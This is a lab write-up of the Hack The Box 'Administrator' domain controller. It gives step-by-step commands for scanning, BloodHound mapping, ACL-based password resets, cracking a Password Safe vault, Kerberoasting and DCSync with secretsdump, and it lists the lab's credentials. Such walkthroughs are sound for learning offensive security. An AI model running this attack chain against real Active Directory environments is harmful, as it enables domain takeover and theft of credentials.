# Administrator (HTB) - Step-by-step notes

## Scope
- Target: 10.10.11.42
- Domain: administrator.htb
- Role: Windows Server 2022 DC (AD services exposed)
- Artifacts: `AdministratorNmapOpenPorts.txt`, `AdministratorNmapServicesVersions.txt`, `Backup.psafe3`, `20251231221639_bloodhound.zip`, `ethan.hash`, `loot/users.txt`

## Step 1 - Full TCP port scan
1) **Command**
```bash
nmap -p- -T4 --min-rate=3000 -Pn -oN AdministratorNmapOpenPorts.txt 10.10.11.42
```
- `-p-`: scan all TCP ports.
- `-T4`: faster timing template.
- `--min-rate=3000`: keep the packet rate high to finish quickly.
- `-Pn`: skip host discovery (treat host as up).
- `-oN`: normal output to a file.

2) **What good output looks like**
- Open ports include `53, 88, 389, 445, 5985, 9389` (AD + WinRM).
- FTP (21) is exposed.
- RPC/SMB ports are present.

3) **Analysis**
- AD services confirm a domain controller on `administrator.htb`.
- Presence of FTP hints at a file-based foothold path.

4) **Next**
- Run a focused service/version scan on the open ports.

## Step 2 - Service/version scan
1) **Command**
```bash
ports=$(awk '/^[0-9]+\/tcp/ {print $1}' AdministratorNmapOpenPorts.txt | cut -d/ -f1 | paste -sd,)
nmap -p"$ports" -sSCV --min-rate=2000 -Pn -oN AdministratorNmapServicesVersions.txt 10.10.11.42
```
- `awk ... | cut ... | paste`: extract the open port numbers into a comma list for `-p`.
- `-sSCV`: default scripts (`-sC`) + version detection (`-sV`).
- `--min-rate=2000`: speed up without full `-T5`.
- `-Pn`: skip host discovery.
- `-oN`: write to file.

2) **What good output looks like**
- LDAP identifies `administrator.htb`.
- HTTPAPI on 5985/47001 indicates WinRM.
- `ftp-syst` confirms Windows FTP.

3) **Analysis**
- Confirmed DC footprint with LDAP/GC/Kerberos/WinRM.

4) **Next**
- Map AD relationships to find a privilege escalation path.

## Step 3 - AD mapping (BloodHound)
1) **Command**
```bash
bloodhound-python -c ALL -u Olivia -p 'ichliebedich' -d administrator.htb -ns 10.10.11.42
```
- `-c ALL`: collect all supported data.
- `-u/-p`: credentials.
- `-d`: domain.
- `-ns`: DNS server (DC IP) to resolve AD records.

2) **What good output looks like**
- Successful LDAP connection to `dc.administrator.htb`.
- Output ZIP created: `20251231221639_bloodhound.zip`.

3) **Analysis**
- BloodHound showed Olivia has outbound object control (GenericAll) over Michael.
- This allows password reset on Michael without knowing the old password.
- Evidence screenshot:
  - ![[Pasted image 20260104200123.png]]

4) **Next**
- Use Olivia to reset Michael’s password, then log in as Michael.

## Step 4 - Reset Michael’s password (GenericAll abuse)
1) **Command**
```bash
evil-winrm -i 10.10.11.42 -u olivia -p 'ichliebedich'
net user michael Password123!
```
- `evil-winrm`: WinRM shell on the DC as Olivia.
- `net user michael Password123!`: reset Michael’s password. On a DC, this applies to the domain user.

2) **What good output looks like**
- `Evil-WinRM shell v3.7` banner.
- `The command completed successfully.` after `net user`.

3) **Analysis**
- GenericAll enables password resets; this is a clean pivot without noisy exploitation.

4) **Next**
- Log in as Michael and enumerate.

## Step 5 - WinRM as Michael (post-reset)
1) **Command**
```bash
evil-winrm -i 10.10.11.42 -u michael -p 'Password123!'
```
- `-i`: target IP.
- `-u/-p`: new Michael credentials.

2) **What good output looks like**
- PowerShell prompt as `michael`.

3) **Analysis**
- Manual enumeration did not surface immediate local escalation on Michael.

4) **Next**
- Pivot from Michael to Benjamin (password reset + FTP access).

2) **Bloodhound info**
- michael has ForceChangePassword over Benjamin. We can change benjamin's password with net rpc
- ![[Pasted image 20260104213050.png]]

## Step 6 - Michael → Benjamin pivot (password reset)
1) **Command**
```bash
evil-winrm -i 10.10.11.42 -u michael -p 'Password123!'
net user benjamin Password123! /administrator.htb

net rpc password "Benjamin" 'Password123!' -U "administrator"/"michael"%'Password123!' -S "10.10.11.42"
```
- `net user benjamin Password123! /administrator.htb`: attempted domain password reset but used an invalid switch; `/DOMAIN` is the correct flag.
- `net rpc password`: reset Benjamin’s password via SMB RPC using Michael’s creds.
- `-U "administrator"/"michael"%'Password123!'`: domain/user and password.
- `-S "10.10.11.42"`: target DC IP.

2) **What good output looks like**
- `The option /ADMINISTRATOR.HTB is unknown.` (shows the syntax error).
- `net rpc password` returns cleanly with no error.
- Benjamin credentials allow FTP login later.

3) **Analysis**
- The failure was syntax, not permissions. The `/DOMAIN` switch should be used for domain ops.
- Resetting Benjamin’s password gave access to FTP, which exposed the Password Safe vault.

4) **Next**
- Use Benjamin to access FTP and retrieve `Backup.psafe3`.

## Step 7 - FTP access and loot (with Benjamin)
1) **Command**
```bash
nxc ftp 10.10.11.42 -u benjamin -p 'Password123!' --ls
nxc ftp 10.10.11.42 -u benjamin -p 'Password123!' --get Backup.psafe3
```
- `nxc ftp ... --ls`: authenticated directory listing.
- `nxc ftp ... --get`: download the PasswordSafe file.

2) **What good output looks like**
- Successful login with `benjamin`.
- `Backup.psafe3` appears in listing.
- File downloads to the local working directory.

3) **Analysis**
- `Backup.psafe3` is a Password Safe database; cracking it can expose multiple creds.

4) **Next**
- Crack `Backup.psafe3` and extract credentials.

## Step 8 - Crack Password Safe vault
1) **Command**
```bash
file Backup.psafe3
hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt --force
passwordsafe Backup.psafe3
```
- `file`: identify the file type.
- `hashcat -m 5200`: Password Safe v3 hash mode.
- `--force`: allow execution even if hashcat warns about the environment.
- `passwordsafe`: open the vault using the cracked password.

2) **What good output looks like**
- `file` reports Password Safe v3 format.
- Hashcat recovers the vault password: `tekieromucho`.
- Vault reveals user credentials.

3) **Analysis**
- The vault provided multiple domain creds, captured in `loot/users.txt`:
  - `alexander : UrkIbagoxMyUGw0aPlj9B0AXSea4Sw`
  - `emily : UXLCI5iETUsIBoFVTj8yQFKoHjXmb`
  - `emma : WwANQWnmJnGV07WQN8bMS7FMAbjNur`
  - `ethan : limpbizkit` (later cracked from Kerberoast)

4) **Next**
- Use a valid low-priv user to Kerberoast.

## Step 9 - Targeted Kerberoast
1) **Command**
```bash
./targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --use-ldaps
```
- `-v`: verbose output.
- `-d`: target domain.
- `-u/-p`: valid user credentials.
- `--use-ldaps`: prefer LDAPS on 636.

2) **What good output looks like**
- TGS hash output for `ethan` (saved to `ethan.hash`).
- Hash string starts with `$krb5tgs$23$`.

3) **Analysis**
- Kerberoast provided an offline crack target for the `ethan` service account.

4) **Next**
- Crack the TGS hash to recover the service account password.

## Step 10 - Crack Kerberoast hash
1) **Command**
```bash
hashcat ethan.hash /usr/share/wordlists/rockyou.txt --force
```
- Hashcat auto-detected the mode for `$krb5tgs$23$`.
- `--force`: allow execution even if hashcat warns.

2) **What good output looks like**
- Recovered password: `limpbizkit` for user `ethan`.

3) **Analysis**
- `ethan` credentials allow higher-privileged AD actions (DCSync in this case).

4) **Next**
- Use `ethan` for DCSync via secretsdump.

## Step 11 - DCSync and domain compromise
1) **Command**
```bash
secretsdump.py 'administrator.htb'/'Ethan':'limpbizkit'@'dc.administrator.htb'
```
- `secretsdump.py`: dump AD secrets; DCSync when the account has rights.
- `domain/user:pass@dc`: target syntax.

2) **What good output looks like**
- NTLM hashes for domain accounts, including `Administrator`.

3) **Analysis**
- DCSync yields domain admin material, enabling final compromise and root flag access.

4) **Next**
- Use the Administrator hash/password to log in (WinRM/SMB) and collect `root.txt`.

## Step 12 - Final access and flags
1) **Command**
```bash
# Use DA material from secretsdump to access Administrator and retrieve flags
```

2) **What good output looks like**
- Successful admin session and `root.txt` retrieval.

3) **Analysis**
- Domain admin control completes the box.

4) **Next**
- Capture flag proof in `evidence/` and finalize notes.

## Lessons Learned
- BloodHound ACL paths (GenericAll) are reliable pivots for password resets.
- Password Safe (`.psafe3`) files are high-value; crack them early if exposed.
- Kerberoast via LDAPS with a low-priv user is fast and repeatable.
